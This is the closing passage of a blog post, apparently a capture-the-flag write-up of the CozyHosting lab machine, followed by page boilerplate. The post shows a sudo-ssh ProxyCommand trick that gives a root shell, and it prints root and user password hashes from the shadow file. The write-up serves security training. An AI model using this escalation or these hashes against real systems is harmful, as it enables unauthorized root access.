+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693735309458-2999b70f-37b4-4102-8312-313c24e6d311.png#averageHue=%23131313&clientId=u29a2d45b-6550-4&from=paste&height=669&id=u78d65278&originHeight=753&originWidth=1206&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=75053&status=done&style=none&taskId=ud3927290-b6ad-488d-99b2-63df700f34c&title=&width=1072" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="root"><a href="#root" class="headerlink" title="root"></a>root</h1><p>Refer: <a href="https://gtfobins.github.io/gtfobins/ssh/#sudo" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/ssh/#sudo</a></p>
+<pre><code class="bash">josh@cozyhosting:~$ sudo -l
+[sudo] password for josh:
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+josh@cozyhosting:~$ sudo /usr/bin/ssh ;bash -i
+usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]
+           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]
+           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]
+           [-i identity_file] [-J [user@]host[:port]] [-L address]
+           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]
+           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]
+           [-w local_tun[:remote_tun]] destination [command [argument ...]]
+josh@cozyhosting:~$ sudo ssh -o ProxyCommand=&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39; x
+# id
+uid=0(root) gid=0(root) groups=0(root)
+#
+# cd /root
+# ls
+root.txt
+# cat root.xt
+cat: root.xt: No such file or directory
+# cat root.xt
+cat: root.xt: No such file or directory
+# cat root.txt
+
+</code></pre>
+<p>太直接了- -吧这个提权，</p>
+<pre><code class="bash">root:$y$j9T$nK3A0N4wTEzopZkv8GQds0$NlR46AiiQOChoO1UNpiOYFIBHM7s956G8l8p/w15Sp2:19577:0:99999:7:::
+josh:$y$j9T$QbN44OK6RyyP01EL9VkVU0$n/uszgmCRdbeaF9OiCVna63BwZCtG.SLHXEXVeluy.1:19498:0:99999:7:::
+</code></pre>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2023-09-10T06:13:02.881Z" itemprop="dateUpdated">2023-09-10 14:13:02</time>
+</span><br>
+
+
+        
+        IF the blog help you a lot ,Buy me a cup of coffee~：<a href="/2023/09/10/CozyHosting/" target="_blank" rel="external">someb0dy.github.io/2023/09/10/CozyHosting/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="someb0dy.github.io">
+            <img src="/img/avatar.jpg" alt="Someb0dy">
+            Someb0dy
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" target="_blank" rel="noopener" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SpringMisconfig-psql/" rel="tag">SpringMisconfig,psql</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=someb0dy.github.io/2023/09/10/CozyHosting/&title=《CozyHosting》 — Someb0dy's blog&pic=someb0dy.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=someb0dy.github.io/2023/09/10/CozyHosting/&title=《CozyHosting》 — Someb0dy's blog&source=Always Be Hungry,Be Foolish" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=someb0dy.github.io/2023/09/10/CozyHosting/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CozyHosting》 — Someb0dy's blog&url=someb0dy.github.io/2023/09/10/CozyHosting/&via=someb0dy.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=someb0dy.github.io/2023/09/10/CozyHosting/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" target="_blank" rel="noopener" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2023/09/10/Zipping/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Zipping</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        IF My blog Help you A lot Please Buy me a coffee~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/ali.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Someb0dy &copy; 2015 - 2023</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" target="_blank" rel="noopener" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=someb0dy.github.io/2023/09/10/CozyHosting/&title=《CozyHosting》 — Someb0dy's blog&pic=someb0dy.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=someb0dy.github.io/2023/09/10/CozyHosting/&title=《CozyHosting》 — Someb0dy's blog&source=Always Be Hungry,Be Foolish" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=someb0dy.github.io/2023/09/10/CozyHosting/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CozyHosting》 — Someb0dy's blog&url=someb0dy.github.io/2023/09/10/CozyHosting/&via=someb0dy.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=someb0dy.github.io/2023/09/10/CozyHosting/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABw0lEQVR42u3aS26EQAwFwLn/pcl2pIjm2f0JiqpXiGGg2FjtZz6feF1f6+7896+/j8dnFi9cXNxp7jVc1QeMr0nuf3cNLi7uee74wfPHyZno5XFxcV/PHZ8ZX4mLi/u/ufk1ryhkuLi4MTdpfqoxR9LebOzVcHFxJ7h5SrnveEu+i4uL2+JexbW2PJWfjouLe4SbF5TqcKUaixSGu7i4uJu51SYnh/ZCkEIggouLu42bRBjVspWHI/lLPqS8uLi4S7kzTUs+fO1tdHBxcf+WO7OLyD/IWPDBFi4u7kHuKkpv4JrfARcX9zw333Akj5yPXcqBKS4u7iJudaMz/13E/L9wcXF3c/NhyfxAJYfe3gcXF/cItzoizcPNmeKY3AEXF3c3Nx95Vl9jJi552Ojg4uIe4VZbkXx0WqijvZQXFxd3M7e3BRkXo09xlTs2XFzcpdyZEtYbuuQvtnhzg4uLG3N7G45e4RufT1ogXFzck9xeq1MtXtVg5SEwxcXFPcKtFpok/igPTXu9ES4u7mu4eVNUjVHKn1zg4uK+jFtNZ/NCdvsvXFzcg9xVIWlStqrlDBcX9zx3pqz0BiG9MQwuLu4R7g9Zo5p5CskXegAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '不想看就别看了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '你还敢回来！';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
